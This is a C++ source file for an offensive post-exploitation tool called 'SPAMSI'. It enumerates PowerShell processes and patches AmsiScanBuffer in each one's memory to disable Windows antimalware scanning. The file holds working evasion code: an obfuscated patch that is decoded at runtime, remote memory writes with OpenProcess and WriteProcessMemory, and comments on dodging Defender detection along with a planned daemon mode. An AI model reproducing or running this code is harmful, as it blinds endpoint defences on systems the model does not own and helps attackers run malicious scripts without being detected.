

/*
* SPAMSI
*
Remote patching of AMSI in all poiwershell/amsi loaded processes.

Will likely require admin for OpenProcess. Could be a good post-ex tool?



*/
//OPTIONAL/IDEA; monitor/daemon mode so anytime a pwsh runs/poll for a run, run this on it and disable amsi.

/*
AV Stuff:

Defender flags on this in the current state: 
    >> Behavior:Win32/Gracing.IQ - which ChatGPT tells me is a Behavior based detection. Fun.

*/

#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <algorithm>
#include <iostream>
#include <psapi.h>
#include <iomanip>
#pragma comment(lib, "Psapi.lib")


class RemoteAmsiPatch {

public:
    DWORD remoteProcessPID;
    HANDLE remoteProcessHandle;
    HMODULE remoteAmsiLibraryAddress;
    uintptr_t remoteAmsiScanBufferFunctionAddress;
    //OG patch
    //unsigned char patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //this is prolly signatured

    //(badly) obsf patch
    unsigned char patch[6] = { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC4 };



    RemoteAmsiPatch(DWORD pid) {
        this->remoteProcessPID = pid;

        //deobs patch
        for (int i = 0; i < 6; i++) {
            patch[i] = patch[i] - 1;
        }
    }

    //var for amsi address
    //var for scanbufferaddress

    //funcs to add
    //[X] //constructor(pid of process) 
    //[X] openremoteProcessHandle //gets process handle n stuff
    //[X] getAmsiAddress()
    //  >> enumprocessmodules
    //[X] getAmsiScanBufferAddress()
    //[X] patchAmsi(AddressOfScanbuffer)
    //[ ] checkIfAmsiLoaded // a precheck to see if amsi is even loaded in this process


    int openremoteProcessHandle() {
        /*
        Get a handle to the remoteProcessPID's process.

        Stored in this->remoteProcessHandle
        */
        std::cout << "[+] Getting handle to " << this->remoteProcessPID << std::endl;
        this->remoteProcessHandle = OpenProcess(
            PROCESS_ALL_ACCESS, //PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,//https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
            //for some reaosn, PROCESS_ALL_ACCESS was needed otherwise the patching iteslf gives an error code of 5. Likekly beciase it wasn't readwrite dur
            FALSE,              //handle inheretnance
            this->remoteProcessPID    //remoteProcessPID
        );

        if (checkIfHandleValid() == 1) {
            return 1;
        }

        std::cout << "[+] Successful handle to " << this->remoteProcessPID << std::endl;
    }

    int getAmsiAddress() {
        /*


        Note, AMSI will liekly be at the amse address each process as it's in each processese virtualmem and loaded into the same place
        */
        std::cout << "[+] Getting address of amsi.dll for " << this->remoteProcessPID << std::endl;
        if (checkIfHandleValid() == 1) {
            return 1;
        }

        //enumprocessmodules
        std::vector<HMODULE> modules(1024); // reserve space for 1024 modules
        DWORD bytesNeeded = 0;

        //stillg etting acecss dened 5
        if (EnumProcessModulesEx(this->remoteProcessHandle, modules.data(), (DWORD)(modules.size() * sizeof(HMODULE)), &bytesNeeded, LIST_MODULES_ALL)) {
            size_t moduleCount = bytesNeeded / sizeof(HMODULE);
            //std::wcout << L"[+] Found " << moduleCount << L" modules in process " << this->remoteProcessPID << std::endl;

            for (size_t i = 0; i < moduleCount; ++i) {
                wchar_t moduleName[MAX_PATH];
                wchar_t fullPath[MAX_PATH];

                // Get short name (like "amsi.dll")
                if (GetModuleBaseNameW(this->remoteProcessHandle, modules[i], moduleName, MAX_PATH)) {
                    // Get full path (like "C:\\Windows\\System32\\amsi.dll")
                    //GetModuleFileNameExW(this->remoteProcessHandle, modules[i], fullPath, MAX_PATH);


                    //std::wcout << L"\t[+] " << moduleName << L" @ 0x" << modules[i] << std::endl; //| " << fullPath << std::endl;

                    //check if process is amsi.dll and if so, get address 
                    std::wstring modNameStr(moduleName);
                    std::transform(modNameStr.begin(), modNameStr.end(), modNameStr.begin(), ::towlower);

                    if (modNameStr == L"amsi.dll") {
                        std::wcout << L"[+] Found amsi.dll @ 0x" << modules[i] << std::endl;
                        this->remoteAmsiLibraryAddress = modules[i];
                    }

                }
            }
        }
        else {
            DWORD lastError = GetLastError();
            std::cerr << "[-] EnumProcessModulesEx failed (error: " << GetLastError() << ")" << std::endl;

            if (lastError == 5) {
                std::cerr << "[!] Access denied to process. Need to be administrator to edit " << this->remoteProcessPID << std::endl;
            }
        }


    }

    int getAmsiScanBufferAddress() {
        /*
        Find the AmsiScanBuffer function

        We can calculate the offset between a locall loaded amsi.dll and AmsiScanBuffer. It's likely this offset is the same
        in other processes.

        Becuase we have the amsi.dll address for the remote process, we can do the follwing, and get the offset for other loaded amsi instances.

            remoteAmsiLibraryAddress + localOffset

        That's assuming something like FG-ALSR doesn't get ever implemented:
            >> https://scholar.dsu.edu/ccspapers/94/
        (Shoutout to Kramer - great professor & a cool dude)

        */
        // Load local copy of amsi.dll
        HMODULE hLocalAmsi = LoadLibraryW(L"amsi.dll");
        if (!hLocalAmsi) {
            std::cerr << "[-] Failed to load amsi.dll locally." << std::endl;
            return 0;
        }

        // Get local address of AmsiScanBuffer
        FARPROC localScanBuffer = GetProcAddress(hLocalAmsi, "AmsiScanBuffer");
        if (!localScanBuffer) {
            std::cerr << "[-] Failed to resolve AmsiScanBuffer." << std::endl;
            return 0;
        }

        // Calculate offset between base of amsi.dll and the AmsiScanBuffer function
        uintptr_t offset = reinterpret_cast<uintptr_t>(localScanBuffer) - reinterpret_cast<uintptr_t>(hLocalAmsi);

        // Apply offset to remote base address
        //return reinterpret_cast<uintptr_t>(remoteAmsiBase) + offset;
        uintptr_t estimatedAmsiScanBufferAddress = reinterpret_cast<uintptr_t>(this->remoteAmsiLibraryAddress) + offset;
        //std::cout << "Estimated AmsiScanBuffer function of PID " << this->remoteProcessPID << " is @ 0x" << std::hex << estimatedAmsiScanBufferAddress << std::endl;
        std::cout << "[+] Estimated AmsiScanBuffer function of PID " << this->remoteProcessPID << " is @ 0x" << std::hex << std::setw(16)
            << std::setfill('0') << std::uppercase << estimatedAmsiScanBufferAddress << std::dec << std::endl;

        this->remoteAmsiScanBufferFunctionAddress = estimatedAmsiScanBufferAddress;
    }

    int patchAmsi() {
        //Trad: chagne to RWX, idea: change to readwrite (instead of RWX)
        //this gets flagged as well
        SIZE_T memorySize = 5;
        DWORD oldProtect;
        BOOL vpResult = VirtualProtectEx(
            this->remoteProcessHandle,
            (LPVOID)this->remoteAmsiScanBufferFunctionAddress,
            memorySize,
            PAGE_EXECUTE_READWRITE,
            &oldProtect
        );
        if (!vpResult) {
            std::cerr << "[-] Failed to change memory protection." << std::endl;
            return 0;
        }

        SIZE_T size = sizeof(this->patch);  // Size of the data you want to write
        LPVOID remoteMemory = VirtualAllocEx(this->remoteProcessHandle, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (remoteMemory == NULL) {
            DWORD lastError = GetLastError();

            std::cerr << "[-] Failed to allocate memory in remote process: " << lastError << std::endl;
            CloseHandle(this->remoteProcessHandle);

            if (lastError == 5) {
                std::cerr << "[!] Access denied to process. Need to be administrator to edit " << this->remoteProcessPID << std::endl;
            }

            return 0;
        }

        std::cout << "[+] Successfully changed " << std::hex << this->remoteAmsiScanBufferFunctionAddress << " to RWX" << std::endl;


        //BOOL result = WriteProcessMemory(this->remoteProcessHandle, remoteMemory, this->patch, size, NULL);
        BOOL result = WriteProcessMemory(this->remoteProcessHandle, (LPVOID)this->remoteAmsiScanBufferFunctionAddress, this->patch, size, NULL);
        if (!result) {
            DWORD lastError = GetLastError();
            std::cerr << "[-] Failed to write to remote process memory: " << lastError << std::endl;
            VirtualFreeEx(this->remoteProcessHandle, remoteMemory, 0, MEM_RELEASE);
            CloseHandle(this->remoteProcessHandle);

            if (lastError == 5) {
                std::cerr << "[!] Access denied to process. Need to be administrator to edit " << this->remoteProcessPID << std::endl;
            }

            return 0;
        }

        std::cout << "[+] Amsi patched successfully for " << this->remoteProcessPID << std::endl;

        return 0;

    }

    int checkIfHandleValid() {
        if (this->remoteProcessHandle == NULL || this->remoteProcessHandle == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] Invalid process handle" << std::endl;
            return 1;
        }
        return 0;
    }

    void info() {
        //prints info about current class

        std::cout << "[+] Target Process PID: " << this->remoteProcessPID << std::endl;
    }
};

std::vector<DWORD> FindPowerShellProcesses() {
    std::vector<DWORD> pids;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return pids;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            //create a new var exe, into a wstring from a wchar_t[], as it's easier to manipulate
            std::wstring exe{ pe.szExeFile };
            std::transform(exe.begin(), exe.end(), exe.begin(), ::towlower); // to lowercase

            //npos == not found with wstring/string. means no positiion
            if (exe.find(L"powershell") != std::wstring::npos || exe.find(L"pwsh") != std::wstring::npos) {
                pids.push_back(pe.th32ProcessID);
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pids;
}


int main() {
    //enum remote processes for powershell etc
    auto powershellPIDs = FindPowerShellProcesses();

    if (powershellPIDs.empty()) {
        std::cout << "No PowerShell processes found." << std::endl;
    }
    else {
        for (DWORD pid : powershellPIDs) {
            std::cout << "[+] Found PowerShell PID: " << pid << std::endl;
        }
    }

    std::cout << "[+] ===== Starting Patching =====" << std::endl;

    for (auto pid : powershellPIDs) {
        std::cout << "[+] ===== Attempting to Patch PID " << pid << " =====" << std::endl;

        //patch stuff here
        RemoteAmsiPatch rap(pid);
        rap.info();
        rap.openremoteProcessHandle();
        rap.getAmsiAddress();
        rap.getAmsiScanBufferAddress();
        rap.patchAmsi();
    }

    return 0;
}

